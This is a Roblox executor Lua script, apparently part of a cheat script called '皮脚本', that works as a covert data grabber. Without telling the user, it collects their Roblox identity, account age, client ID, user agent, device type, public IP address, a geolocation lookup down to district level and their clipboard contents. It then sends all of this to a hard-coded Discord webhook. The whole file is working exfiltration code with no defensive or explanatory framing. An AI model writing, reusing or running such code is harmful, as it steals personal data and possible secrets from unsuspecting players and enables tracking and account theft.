local Webhook = "https://discord.com/api/webhooks/1275482402336145470/1D6PstGHwOpuffpumoDaSH6a1tbnAXzx2m2cYfVU3OzUS-dtAE8LALldoeq6J0KxUhYL"
local HS = game:GetService("HttpService")
local player = game:GetService("Players").LocalPlayer
local joinTime = os.time() - (player.AccountAge * 86400)
local joinDate = os.date("!*t", joinTime)
local premium = player.MembershipType == Enum.MembershipType.Premium

local alt = false

_G.IsPc = game.UserInputService.KeyboardEnabled and game.UserInputService.MouseEnabled and "模拟器/PC" or game.UserInputService.TouchEnabled and "IOS/Android" or "IOS/Android/Unknown"

local function GetJson(v)
    return HS:JSONDecode(game:HttpGet(v))
end

local Location = {}
local function GetIP()
    local IPInfo = GetJson("https://searchplugin.csdn.net/api/v1/ip/get")
    local IP = IPInfo.data.ip
    local Url = "https://cz88.net/api/cz88/ip/accurate?ip=" .. IP
    local Json = GetJson(Url).data.locations
    Location = GetJson(Url).data
    if #Json == 0 then
        return "[" .. IP .. "](" .. Url .. ")"
    end
    for i, v in pairs(Json) do
        Json[i] = v.longitude .. "," .. v.latitude
    end
    return "[" .. IP .. "](https://uri.amap.com/marker?markers=" .. table.concat(Json, "|") .. ")"
end

local user = game:HttpGet("https://users.roblox.com/v1/users/" .. player.UserId)
local json = HS:JSONDecode(user)
local executor = "Unknown"
if identifyexecutor then
    executor = identifyexecutor()
end

local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true",player.UserId))
Thing = HS:JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl

local msg = {
    ["username"] = "皮脚本-机器人️",
    ["embeds"] = {
        {
            ["color"] = tonumber("0x32CD32"),
            ["title"] = "有人正在使用皮脚本" .. os.date("%H") .. "时" .. os.date("%M") .. "分",
            ["thumbnail"] = {
                ["url"] = AvatarImage
            },
            ["fields"] = {
                {   ["name"] = "用户名(User name)", 
                    ["value"] = player.Name, 
                    ["inline"] = true
                },
                {   
                    ["name"] = "名称(Name)", 
                    ["value"] = player.DisplayName, 
                    ["inline"] = true
                },
                {
                    ["name"] = "用户ID(Userid)", 
                    ["value"] = game.Players.LocalPlayer.UserId, 
                    ["inline"] = true
                },
                {
                    ["name"] = "服务器ID(Serverid)",
                    ["value"] = "[" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "服务器名称(Servername)",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true
                },
                {   ["name"] = "IP", 
                    ["value"] = GetIP(), 
                    ["inline"] = true
                },
                {
                    ["name"] = "地址(Address)",
                    ["value"] = Location.country .. "/" .. Location.province .. "/" .. Location.city .. "/" .. Location.districts,
                    ["inline"] = true
                },
                {   
                    ["name"] = "使用的注入器(Injectorused)", 
                    ["value"] = executor, 
                    ["inline"] = true
                },
                {   ["name"] = "账号年龄(Accountage)", 
                    ["value"] = player.AccountAge .. "天(Sky)", 
                    ["inline"] = true
                },
                {
                    ["name"] = "加入日期(Joiningdate)",
                    ["value"] = joinDate.day .. "/" .. joinDate.month .. "/" .. joinDate.year,
                    ["inline"] = true
                },
                {   ["name"] = "UA", 
                    ["value"] = HS:GetUserAgent(), 
                    ["inline"] = true
                },
                {   
                    ["name"] = "剪贴板(Clipboard)", 
                    ["value"] = getclipboard(), 
                    ["inline"] = true
                },
                {
                    ["name"] = "客户端ID(Clientid)",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = false
                },
                {
                    ["name"] = "设备(Equipment)", 
                    ["value"] = _G.IsPc, 
                    ["inline"] = false
                },
            }
        }
    }
}

local request = http_request or request or HttpPost or syn.request
request({
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HS:JSONEncode(msg)
})